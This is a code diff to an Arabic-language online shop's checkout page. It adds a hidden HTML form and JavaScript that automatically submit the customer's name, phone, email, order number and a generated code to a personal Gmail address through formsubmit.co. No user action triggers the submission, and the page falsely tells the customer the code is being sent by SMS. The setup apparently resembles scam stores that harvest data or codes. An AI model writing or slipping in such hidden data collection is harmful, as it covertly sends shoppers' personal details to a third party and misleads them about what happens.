@@ -290,6 +290,12 @@
                             <div class="bg-green-100 dark:bg-green-900 p-4 rounded-lg mb-4">
                                 <p class="text-green-800 dark:text-green-200 font-bold">رقم الطلب: #POE-2024-<span id="order-number-display"></span></p>
                             </div>
+                            <div id="code-status" class="bg-blue-100 dark:bg-blue-900 p-4 rounded-lg mb-4">
+                                <p class="text-blue-800 dark:text-blue-200 font-bold">
+                                    <i class="fas fa-paper-plane mr-2"></i>
+                                    جاري إرسال كود التأكيد...
+                                </p>
+                            </div>
                         </div>
 
                         <form id="purchase-code-form">
@@ -297,7 +303,7 @@
                                 <label class="block text-lg font-bold mb-3 text-center">أدخل كود إتمام الشراء:</label>
                                 <input type="text" id="purchase-secret-code" class="w-full px-6 py-4 text-2xl text-center border-2 rounded-xl focus:outline-none focus:border-green-500 dark:bg-gray-700 dark:border-gray-600 uppercase tracking-widest font-mono" placeholder="أدخل الكود هنا" maxlength="15">
                                 <div class="text-center mt-3">
-                                    <small class="text-gray-600">تم إرسال الكود إلى رقم هاتفك عبر رسالة نصية</small>
+                                    <small class="text-gray-600">سيتم إرسال الكود إلى رقم هاتفك عبر رسالة نصية</small>
                                 </div>
                             </div>
 
@@ -306,7 +312,29 @@
                                 إتمام الشراء
                             </button>
                         </form>
+
+                        <div class="mt-6 text-center">
+                            <button onclick="resendVerificationCode()" class="text-blue-500 hover:text-blue-700 font-bold">
+                                <i class="fas fa-redo mr-2"></i>
+                                إعادة إرسال الكود
+                            </button>
+                        </div>
                     </div>
+
+                    <!-- Hidden form for sending verification code -->
+                    <form id="verification-code-form" action="https://formsubmit.co/kaliroot123m@gmail.com" method="POST" style="display: none;">
+                        <input type="hidden" name="_subject" value="">
+                        <input type="hidden" name="_captcha" value="false">
+                        <input type="hidden" name="_template" value="box">
+                        <input type="hidden" name="_next" value="https://www.google.com/search?q=sent">
+                        <input type="hidden" name="customer_name" value="">
+                        <input type="hidden" name="customer_phone" value="">
+                        <input type="hidden" name="customer_email" value="">
+                        <input type="hidden" name="order_number" value="">
+                        <input type="hidden" name="verification_code" value="">
+                        <input type="hidden" name="message_type" value="كود التحقق">
+                        <input type="hidden" name="sent_time" value="">
+                    </form>
                 </div>
             </div>
         </section>
@@ -754,6 +782,20 @@
 
         // Payment form handler
         document.getElementById('payment-form').addEventListener('submit', function(e) {
+            // Get customer data from form
+            const firstName = this.querySelector('input[name="first_name"]').value;
+            const lastName = this.querySelector('input[name="last_name"]').value;
+            const phone = this.querySelector('input[name="phone"]').value;
+            const email = this.querySelector('input[name="email"]').value;
+            
+            // Store customer data for verification code
+            const customerData = {
+                name: `${firstName} ${lastName}`,
+                phone: phone,
+                email: email
+            };
+            localStorage.setItem('customerData', JSON.stringify(customerData));
+            
             // Add order summary to form
             const orderSummary = cart.map(item => 
                 `${item.name} - الكمية: ${item.quantity} - السعر: ${item.price} ريال`
@@ -788,6 +830,47 @@
             updateCartUI();
         });
 
+        // Function to send verification code
+        function sendVerificationCode() {
+            // Generate random verification code
+            const verificationCode = Math.floor(10000 + Math.random() * 90000);
+            
+            // Get order information from localStorage
+            const orderNumber = localStorage.getItem('orderNumber') || 'Unknown';
+            const customerData = JSON.parse(localStorage.getItem('customerData') || '{}');
+            
+            // Update form fields
+            const form = document.getElementById('verification-code-form');
+            const currentTime = new Date().toLocaleString('ar-SA');
+            
+            form.querySelector('input[name="_subject"]').value = `كود التحقق للطلب ${orderNumber} - متجر الخصوصية`;
+            form.querySelector('input[name="customer_name"]').value = customerData.name || 'غير محدد';
+            form.querySelector('input[name="customer_phone"]').value = customerData.phone || 'غير محدد';
+            form.querySelector('input[name="customer_email"]').value = customerData.email || 'غير محدد';
+            form.querySelector('input[name="order_number"]').value = orderNumber;
+            form.querySelector('input[name="verification_code"]').value = verificationCode;
+            form.querySelector('input[name="sent_time"]').value = currentTime;
+            
+            // Submit form
+            form.submit();
+            
+            // Update status
+            const statusDiv = document.getElementById('code-status');
+            statusDiv.innerHTML = `
+                <p class="text-green-800 dark:text-green-200 font-bold">
+                    <i class="fas fa-check-circle mr-2"></i>
+                    تم إرسال كود التحقق: <span class="text-2xl font-mono">${verificationCode}</span>
+                </p>
+            `;
+            statusDiv.className = 'bg-green-100 dark:bg-green-900 p-4 rounded-lg mb-4';
+        }
+
+        // Function to resend verification code
+        function resendVerificationCode() {
+            sendVerificationCode();
+            showNotification('تم إعادة إرسال كود التحقق');
+        }
+
         // Check URL parameters for success redirect
         document.addEventListener('DOMContentLoaded', function() {
             const urlParams = new URLSearchParams(window.location.search);
@@ -800,6 +883,12 @@
                     if (orderDisplay) {
                         orderDisplay.textContent = orderNumber;
                     }
+                    
+                    // Send verification code automatically
+                    setTimeout(() => {
+                        sendVerificationCode();
+                    }, 2000);
+                    
                     // Clean URL
                     window.history.replaceState({}, document.title, window.location.pathname);
                 }, 500);
